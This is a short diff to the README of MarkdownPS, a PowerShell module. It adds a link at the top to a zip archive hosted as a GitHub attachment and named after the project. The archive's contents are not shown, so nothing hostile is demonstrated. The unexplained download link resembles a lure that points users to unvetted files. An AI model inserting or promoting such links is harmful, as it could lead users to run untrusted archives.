@@ -1,3 +1,4 @@
+[MarkdownPS-master.zip](https://github.com/user-attachments/files/18149749/MarkdownPS-master.zip)
 [![Build status](https://ci.appveyor.com/api/projects/status/a0fksoh6g9osnu5g/branch/master?svg=true)](https://ci.appveyor.com/project/Alex61243/markdownps/branch/master)
 [![MarkdownPS@PowerShell Gallery](https://img.shields.io/powershellgallery/dt/MarkdownPS?label=MarkdownPS%40PowerShell%20Gallery)](https://www.powershellgallery.com/packages/MarkdownPS/)
 
